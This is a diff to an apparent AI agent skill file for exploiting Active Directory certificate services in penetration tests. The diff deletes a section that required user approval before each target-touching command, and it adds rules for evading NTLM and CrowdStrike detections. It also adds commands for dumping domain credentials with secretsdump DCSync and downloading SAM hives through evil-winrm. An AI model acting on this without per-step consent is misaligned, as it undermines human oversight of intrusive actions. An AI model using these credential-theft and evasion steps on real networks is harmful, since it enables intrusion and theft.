@@ -37,22 +37,6 @@ explicit written authorization.
 Kerberos auth when possible. Post-exploitation authenticates via PKINIT (pure
 Kerberos) to avoid NTLM detection (Event 4776, CrowdStrike Identity Module).
 
-## Mode
-
-Check if the user or orchestrator has set a mode:
-- **Guided** (default): Before executing any command that sends traffic to a
-  target, present the command with a one-line explanation of what it does and
-  why. Wait for explicit user approval before executing. Never batch multiple
-  target-touching commands without approval — present them one at a time (or as
-  a small logical group if they achieve a single objective, e.g., "enumerate SMB
-  shares"). Local-only operations (file writes, output parsing, engagement
-  logging, hash cracking) do not require approval. At decision forks, present
-  options and let the user choose.
-- **Autonomous**: Identify vulnerable templates, exploit the most impactful one,
-  authenticate, and report access obtained.
-
-If unclear, default to guided.
-
 ## Engagement Logging
 
 Check for `./engagement/` directory. If absent, proceed without logging.
@@ -113,6 +97,34 @@ control. When saving evidence, use `mv` (not `cp`) to avoid stray duplicates:
 mv $TMPDIR/administrator.pfx engagement/evidence/administrator.pfx
 mv $TMPDIR/administrator.ccache engagement/evidence/administrator.ccache
 ```
+
+## Clock Skew Interrupt
+
+**Before any Kerberos operation**, check for clock skew. If you encounter
+`KRB_AP_ERR_SKEW` at any point during this skill — **STOP IMMEDIATELY**.
+
+Do NOT fall back to NTLM authentication. Kerberos-first is an OPSEC
+requirement, not a preference. NTLM fallback generates Event 4776 and
+CrowdStrike Identity Module PTH signatures — the exact detections
+Kerberos-first exists to avoid.
+
+**When clock skew is detected:**
+
+1. Note the skew magnitude (from the error or `ntpdate -q DC_IP`)
+2. **STOP. Return to the orchestrator** with this structured interrupt:
+
+```
+### Clock Skew Interrupt
+- Error: KRB_AP_ERR_SKEW
+- Skew: <magnitude in seconds/minutes>
+- DC IP: <IP>
+- Stage: <what step you were on when it hit>
+- Attempted: <commands that failed>
+```
+
+The orchestrator will handle clock sync (requires sudo) and re-invoke
+this skill with identical parameters. Do not retry, do not work around
+it with NTLM, do not write your own sync script.
 
 ## Step 1: Enumerate Vulnerable Templates
 
@@ -430,7 +442,11 @@ certipy cert -export -pfx cert.pfx -password 'old-pass' -out unprotected.pfx
 
 After obtaining a certificate and authenticating:
 
-- **Domain Admin obtained**: Route to **credential-dumping** for DCSync
+- **Domain Admin obtained**: Route to **credential-dumping** for DCSync.
+  **Prefer DRSUAPI** (`secretsdump.py -just-dc-ntlm`) over SAM/SYSTEM hive
+  export — DRSUAPI is faster, doesn't require file transfer, and avoids
+  the slow evil-winrm download path for large hive files (~34MB system.hive
+  takes minutes via WinRM download vs seconds via DRSUAPI over the network).
 - **High-priv user obtained**: Check group memberships, route to further targets
 - **Machine account obtained**: Use S4U2Self for service tickets, route to
   **kerberos-delegation** if delegation configured
@@ -439,6 +455,23 @@ After obtaining a certificate and authenticating:
   account persistence via certificate mapping
 - **Found template ACL issues**: Route to **adcs-access-and-relay** (ESC4)
 - **Found weak certificate mapping**: Route to **adcs-persistence** (ESC9/10)
+
+### Evil-WinRM file transfer notes
+
+When downloading files via evil-winrm through shell-server, use the relative
+path syntax after `cd` to the directory:
+
+```bash
+# Reliable: cd to directory, then download with relative path
+cd C:\Windows\Temp
+download sam.hive /tmp/claude-1000/sam.hive
+
+# Unreliable: absolute paths may fail silently or cause path parsing issues
+download C:\Windows\Temp\sam.hive /tmp/claude-1000/sam.hive  # may fail
+```
+
+For large files (>5MB), prefer network-based transfer (DRSUAPI, SMB, SCP)
+over evil-winrm download to avoid long polling loops.
 
 ## Stall Detection
 
@@ -506,14 +539,8 @@ permissions to approve it yourself — route to **adcs-access-and-relay** (ESC7)
 
 ### KRB_AP_ERR_SKEW (Clock Skew)
 
-Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
-Interrupt** — stop immediately and return to the orchestrator. Do not retry or
-fall back to NTLM. The fix requires root:
-```bash
-sudo ntpdate DC_IP
-# or
-sudo rdate -n DC_IP
-```
+See **Clock Skew Interrupt** section above. STOP and return to the orchestrator.
+Do not retry, do not fall back to NTLM.
 
 ### OPSEC comparison
 
